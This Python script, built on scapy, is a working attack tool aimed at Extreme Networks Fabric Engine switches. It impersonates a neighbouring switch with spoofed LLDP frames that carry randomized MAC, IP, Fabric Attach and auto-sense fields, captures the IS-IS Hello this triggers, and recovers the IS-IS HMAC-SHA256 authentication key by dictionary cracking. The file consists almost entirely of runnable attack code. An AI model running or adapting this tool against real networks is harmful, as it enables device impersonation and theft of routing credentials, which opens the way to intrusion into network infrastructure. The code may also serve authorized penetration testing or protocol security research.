__version__ = "0.1.0"

import os
import subprocess
import sys
import random
import socket
from scapy.all import *
from scapy.contrib.lldp import *
from scapy.contrib.isis import *
from hashlib import sha256
from hashlib import md5
import hmac

#IFACE = "br-lan"
#MY_MAC = get_if_hwaddr(IFACE)
BLOCK_SIZE = 64 #B, in bytes, 64 for sha-256
HASH_LEN = 32 #L, in bytes, 32 for sha-256. L is the length of the hash, measured in octets rather than bits.
OPAD = b"\x5c" * BLOCK_SIZE
IPAD = b"\x36" * BLOCK_SIZE
APAD = bytes.fromhex("878FE1F3") * (HASH_LEN // 4)  # to be repeated HASH_LEN/4 times = 8 times

# If auth.length = 17 then it's md5 ()
# If auth.length = 35 then it's sha-256 ()
# Type is always 10 (0a), then length, then hash function (03 for sha256, 54 (36) for md5)
# For type sha256 only, keyid is coded on 2 bytes before the hash itself

# Derive the 5th byte of the target MAC address. Keep the MAC vendor and the last byte to 00.
def derive_mac(input: str) -> str:
    parts = input.split(":")
    parts[4] = f"{random.randint(0, 255):02x}"
    new_mac = ":".join(parts)
    return new_mac

# Derive the last byte of the target IP address.
def derive_ip(input: bytes) -> bytes:
    # TODO : Ensure the random value is not the input value (low chance but...)
    parts = list(input)
    parts[3] = random.randint(1, 254)
    new_ip = bytes(parts)
    return new_ip

# Derive systemid field
def derive_autosense(input: bytes) -> bytes:
    return input[:3] + os.urandom(6) + input[-8:]

# Derive received LLDP packet and send it back
def send_lldp(packet: Packet, iface):
    src_mac = packet[0].getlayer(LLDPDUChassisID).id
    src_ip = packet[0].getlayer(LLDPDUManagementAddress).management_address
    src_fa = packet[0].getlayer(LLDPDUGenericOrganisationSpecific, 1)
    src_autosense = packet[0].getlayer(LLDPDUGenericOrganisationSpecific, 2)

    #packet[0].layers()
    #print("###############################")
    #packet.show()
    #print(lastlayer(packet[0]))
    #print(packet[0].lastlayer)
    #print(type(src_mac))
    #print(mac2str(src_mac))
    #print(src_mac)
    #print(socket.inet_ntoa(src_ip))
    #print(list(src_org))
    #print("FA show")
    #print(type(src_fa))
    #src_fa.show()
    #print(src_fa.data[:-10])
    #print("Autosense show")
    #src_autosense.show()
    #print("###############################")

    #packet[0].getlayer(LLDPDUManagementAddress).show()
    #print(packet[0].getlayer(LLDPDUChassisID).id)
    
    # Derive target MAC address' 5th byte. Keep MAC vendor intact, and last byte to 00.
    new_mac = derive_mac(src_mac)
    # Derive target IP address' 4th byte.
    new_ip = derive_ip(src_ip)
    # Derive target Fabric Attach payload with new MAC address
    new_fa = src_fa.data[:-10] + mac2str(new_mac) + bytearray(b'\x00\x00\x00\xc0')
    # Derive target Auto-sense payload with new systemid.
    new_autosense = derive_autosense(src_autosense.data)

    # print(new_mac)
    # print(mac2str(new_mac))
    # print(src_fa.data)
    # print(new_fa)
    #print(socket.inet_ntoa(new_ip))
    pkt_to_send=packet[0]
    pkt_to_send[Ether].src = new_mac
    pkt_to_send[LLDPDUChassisID].id = new_mac
    pkt_to_send[LLDPDUManagementAddress].management_address = new_ip

    # FA and auto-sense are both OrganisationSpecific fields by scapy. The only for now to differentiate them is the org_code used.
    REPLACEMENTS = {
        1037:     new_fa,
        14189670: new_autosense,
    }
    for layer in pkt_to_send.iterpayloads():
        if isinstance(layer, LLDPDUGenericOrganisationSpecific) and layer.org_code in REPLACEMENTS:
            layer.data = REPLACEMENTS[layer.org_code]
    # if pkt_to_send[LLDPDUGenericOrganisationSpecific:1].org_code == 1037 :
    #     pkt_to_send[LLDPDUGenericOrganisationSpecific:1].data = new_fa
    # if pkt_to_send[LLDPDUGenericOrganisationSpecific:2].org_code == 14189670 :
    #     pkt_to_send[LLDPDUGenericOrganisationSpecific:2].data = new_autosense

    #pkt_to_send.show()
    # TODO : Check packet conformity before sending ?
    #wrpcap(filename="Wireshark_captures/output_lldp.pcapng",pkt=pkt_to_send)
    sendp(pkt_to_send, iface=iface, count=10, inter=1)

# Compute Ko, First-Hash and Second-Hash
def get_hash(key: bytes, isis_apad: bytes) -> bytes:
    # "Ko is always L octets long" so here Ko is alway HASH_LEN octets long.
    # First-Hash = H(Ko XOR Ipad || (IS-IS PDU))
    # Second-Hash = H(Ko XOR Opad || First-Hash)
    if len(key) > HASH_LEN:
        key = sha256(key).digest()
    return hmac.new(key, isis_apad, sha256).digest()

# Extract received hash and compare with computed hashes from dictionnary list
def find_isis_key(packet: Packet, dict_param):
    #print(packet[0].original.hex())
    t_password = packet[0].getlayer(ISIS_AuthenticationTlv).password
    t_hash = t_password[2:] # Remove 2 first bytes matching the keyID in sha-2
    t_key = t_password[:2] # keep original keyID
    f_key = None

    # Step 1 : Get ISIS PDU
    isis_pdu = packet.getlayer(ISIS_CommonHdr)
    isis_bytes = isis_pdu.original
    #print(isis_bytes[0])
    # Step 2 : Remove ISIS authentifcation data. 
    # TODO: Assume sha2 only for now. Add MD5 and no authentication later.
    #isis_pdu_trunc, pad = packet.extract_padding(isis_pdu)
    #isis_bytes_trunc = isis_bytes[:-32]

    assert bytes(packet[ISIS_CommonHdr]) == packet[ISIS_CommonHdr].original

    # Step 3 : Concatenate APAD value to previously truncated PDU
    #isis_apad = isis_bytes_trunc + APAD
    packet[0].getlayer(ISIS_AuthenticationTlv).password = t_key + APAD
    #print("###########################################################################")
    #print(raw(packet[0]).hex())

    # Step 4 : For each dict entry, evaluate hash d_hash, against captured hash t_hash
    computed_packet = bytes(packet[ISIS_CommonHdr])
    with open(dict_param, 'rb') as my_dict:
        for key in my_dict:
            d_hash = get_hash(key.rstrip(b"\n"), computed_packet)
            if t_hash == d_hash:
                f_key = key;
                break;
    return f_key

# Listen to network interface, capture LLDP and ISIS packets only, find the ISIS key
# Script assume target switch is Extreme Networks running Fabric Engine with auto-sense
def main():
    # A single sniffer to capture both LLDP and ISIS.
    # On the first LLDP from the target, impersonate a switch and send a LLDP packet to trigger the ISIS Hello;
    # On the ISIS Hello from the target, dissect the packet and find the key.
    # Forming ISIS adjacency from virtual VOSS switch is outside the scope of this script for now...
    start_time = time.time()
    state = {}

    if len(sys.argv) != 3:
        print("Script usage : script.py <network interface> <dictionnary>")
        return 1
    iface = sys.argv[1]
    dict_param = sys.argv[2]
    i_mac = get_if_hwaddr(iface)



    def handle(pkt):
        # LLDP from the target -> impersonate a switch to trigger the ISIS Hello.
        # Keep received state in state to only trigger the send_lldp() once
        if pkt.haslayer(LLDPDU) and not state.get("lldp_sent"):
            state["lldp_sent"] = True
            send_lldp(pkt, iface)
        # ISIS Hello back from the target
        elif pkt.haslayer(ISIS_CommonHdr):
            state["isis"] = pkt

    # keep only LLDP and ISIS; ignore our own frame; stop as soon as ISIS is caught.
    sniff(
        iface=iface,
        lfilter=lambda p: p.src != i_mac
            and (p.haslayer(LLDPDU) or p.haslayer(ISIS_CommonHdr)),
        prn=handle,
        stop_filter=lambda p: "isis" in state,
        timeout=30,  # timeout if no LLDP/ISIS Hello is received within 30s (Maximum LLDP timer)
    )

    if "isis" not in state:
        print("No ISIS Hello captured within timeout.")
        return

    f_key = find_isis_key(state["isis"], dict_param)
    if f_key:
        print("Key found: ", f_key.decode())
    else:
        print("Key not found, try another dictionnary.")

    print("--- %s seconds ---" % (time.time() - start_time))

if __name__ == "__main__":
    main()